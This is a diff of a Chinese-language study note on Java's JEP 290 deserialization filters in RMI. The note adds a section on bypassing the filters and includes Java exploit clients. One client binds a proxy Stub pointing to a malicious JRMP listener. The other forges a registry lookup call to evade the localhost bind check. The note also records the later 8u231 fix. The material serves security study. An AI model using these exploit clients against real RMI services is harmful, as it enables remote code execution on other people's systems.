@@ -4,7 +4,9 @@
 
 针对此JDK9加入了一个反序列化的安全机制————JEP 290
 
-在JDK6、7、8的高版本中也引入了这个机制（JDK8121、JDK7u131、JDK6u141）
+> JEP：Java Enhancement Proposal 即Java增强提议，像新语法什么的都会在这出现
+
+是在Java9提出的，但在JDK6、7、8的高版本中也引入了这个机制（JDK8121、JDK7u131、JDK6u141）
 
 官方的描述👉https://openjdk.org/jeps/290
 
@@ -155,11 +157,13 @@ pkg与`Class.getName()`进行比较
 
 可能需要通过反射去修改Config的`serialFilter`属性
 
-因为对象实例化后`serialFilter`已经被赋值了，但`setSerialFilter`会检查`serialFilter`是否为空，不为空就改不了。（笑死，不让改那这方法有啥用）
+因为对象实例化后`serialFilter`已经被赋值了，但`setSerialFilter`会检查`serialFilter`是否为空，不为空就改不了。这方法估计就是用来代替设置`jdk.serialFilter`全局属性的。
 
 ![image-20231019160617582](./../.gitbook/assets/image-20231019160617582.png)
 
 # Filter in RMI
+
+## Normal RemoteObject
 
 RMI在调用远程方法时，服务端会反序列化客户端发送的序列化参数对象。
 
@@ -167,11 +171,13 @@ RMI在调用远程方法时，服务端会反序列化客户端发送的序列�
 
 ![image-20231019165313000](./../.gitbook/assets/image-20231019165313000.png)
 
-`unmarshalCustomCallData`就设置了一个局部过滤器，对传入的`MarshalInputStream`设置`serialFilter`，来过滤远程方法的调用参数。
+`UnicastServerRef`多了一个属性`filter`，可在构造的时候传入。
+
+`unmarshalCustomCallData`设置了一个局部过滤器，对传入的`MarshalInputStream`设置`serialFilter`，来过滤远程方法的调用参数。
 
 ![image-20231019165735064](./../.gitbook/assets/image-20231019165735064.png)
 
-但很可惜这个filter默认是null，也就是设置普通的远程对象，默认没有反序列化过滤器。
+但很可惜这个filter默认是null，也就是默认没有反序列化过滤器。
 
 远程对象继承了`UnicastRemoteObject`，其构造方法会把自身导出，
 
@@ -180,6 +186,8 @@ RMI在调用远程方法时，服务端会反序列化客户端发送的序列�
 ![image-20231019191041459](./../.gitbook/assets/image-20231019191041459.png)
 
 可以看到这里构造`UnicastServerRef`时默认过滤器为null。
+
+## RegistryImpl
 
 但对于注册中心`RegistryImpl`的创建，就指定了一个过滤器。
 
@@ -219,6 +227,155 @@ RMI在调用远程方法时，服务端会反序列化客户端发送的序列�
 
 `Config.createFilter2`和`Config.createFilter`的区别在于前者不会检测数组里的元素类型。
 
+## DGCImpl
+
+同样`DGCImpl`也设置了自己的白名单
+
+![image-20240224153750046](./../.gitbook/assets/image-20240224153750046.png)
+
+![image-20240224154031763](./../.gitbook/assets/image-20240224154031763.png)
+
+# Bypass JEP290 in RMI
+
+首先就是对于普通的远程对象，其`UnicastServerRef`的`filter`默认为null，因此传输恶意对象让其进行反序列化仍可以打。
+
+感觉这个叫bypass很勉强，只是JEP290对反序列化的点没有防御全面，而不是防御逻辑出问题。
+
+其次注意到上面的防护只是针对服务端的引用层，都是在`UnicastServerRef`中调用`unmarshalCustomCallData`将`filter`注册进来，
+
+而对于客户端的引用层`UnicastRef`，并没有发现过滤器的注册，因此`payloads.JRMPClient`/`exploit.JRMPListner`仍可以打
+
+既然对于客户端没有防护，那么能不能让服务端变成客户端呢？
+
+注册中心设置白名单肯定要保证原本功能的正常运行，也就是通过`bind`传递的`Stub`肯定要能被反序列化，才能被注册中心接收。
+
+看一眼白名单，`Remote`、`UnicastRef`、`UID`、`Number`、`String`这些基本的`bind`要传的类是有的
+
+结合前面RMI讲的`UnicastRef`反序列化会触发`DGC`的`dirty`，因此我们构造一个指向我们恶意JRMP服务的远程对象Stub，让注册中心往我们的恶意服务端发送租赁请求，接着返回恶意数据让其反序列化。
+
+```java
+public class RMIServer {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        while (true) {
+            Thread.sleep(10000);
+        }
+    }
+}
+```
+
+```java
+public class RMIClient {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 12233);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        Remote proxy = (Remote) Proxy.newProxyInstance(RMIClient.class.getClassLoader(), new Class[]{
+                Remote.class
+        }, obj);
+        registry.bind("x", proxy);
+    }
+}
+```
+
+`TCPEndpoint`指向了`JRMPListener`的主机和端口
+
+![image-20240224164422504](./../.gitbook/assets/image-20240224164422504.png)
+
+上面的payload只能在本地打通。
+
+之前不是说注册中心压根没有做身份验证嘛，任何人都可以随便`bind`对象上去
+
+高版本RMI修复了这个问题，`RegistryImpl_Skel`在调用`bind`、`rebind`、`unbind`之前会判断客户端的IP和本机IP是否相同
+
+![image-20240224172846402](./../.gitbook/assets/image-20240224172846402.png)
+
+![image-20240224172928024](./../.gitbook/assets/image-20240224172928024.png)
+
+当然`list`、`lookup`这些客户端正常使用的功能就没有这个限制
+
+![image-20240224173053044](./../.gitbook/assets/image-20240224173053044.png)
+
+但是如果客户端直接调用`lookup`，只能传递字符串。
+
+我们可以直接仿造`RegistryImpl_Stub`实现一个`lookup`方法，使其接收`Object`对象，并把`opnum`改成`lookup`对应的2
+
+```java
+public class RMIClient {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 12233);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        lookup(registry, obj);
+    }
+
+    public static Remote lookup(Registry registry, Object obj)
+            throws Exception {
+        RemoteRef ref = (RemoteRef) getFieldValue(registry, "ref");
+        long interfaceHash = Long.valueOf(String.valueOf(getFieldValue(registry, "interfaceHash")));
+
+        java.rmi.server.Operation[] operations = (Operation[]) getFieldValue(registry, "operations");
+        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, 2, interfaceHash);
+        try {
+            try {
+                java.io.ObjectOutput out = call.getOutputStream();
+                out.writeObject(obj);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling arguments", e);
+            }
+            ref.invoke(call);
+            return null;
+        } catch (RuntimeException | RemoteException | NotBoundException e) {
+            if(e instanceof RemoteException| e instanceof ClassCastException){
+                return null;
+            }else{
+                throw e;
+            }
+        } catch (java.lang.Exception e) {
+            throw new java.rmi.UnexpectedException("undeclared checked exception", e);
+        } finally {
+            ref.done(call);
+        }
+    }
+
+    public static Object getFieldValue(Object o, String name) throws Exception {
+        Class<?> superClazz = o.getClass();
+        Field f = null;
+        while (true) {
+            try {
+                f = superClazz.getDeclaredField(name);
+                break;
+            } catch (NoSuchFieldException e) {
+                superClazz = superClazz.getSuperclass();
+            }
+        }
+        f.setAccessible(true);
+        return f.get(o);
+    }
+}
+```
+
+`JDK 8u231`修复了`DGCImpl_Stub`，反序列化前设置了过滤器
+
+![image-20240224165908094](./../.gitbook/assets/image-20240224165908094.png)
+
+![image-20240224170026968](./../.gitbook/assets/image-20240224170026968.png)
+
+```java
+return (clazz == ObjID.class ||
+        clazz == UID.class ||
+        clazz == VMID.class ||
+        clazz == Lease.class) ? ObjectInputFilter.Status.ALLOWED: ObjectInputFilter.Status.REJECTED;
+```
+
+白名单绕不过了。
+
+后面的版本`UnicastRef`貌似也没有对异常类进行反序列化了。
+
 # Filter in WebLogic
 
 海妹学weblogic，占个位
@@ -226,3 +383,5 @@ RMI在调用远程方法时，服务端会反序列化客户端发送的序列�
 # Ref
 
 * https://paper.seebug.org/1689/
+* https://xz.aliyun.com/t/8706
+* https://baicany.github.io/2023/07/30/jrmp/
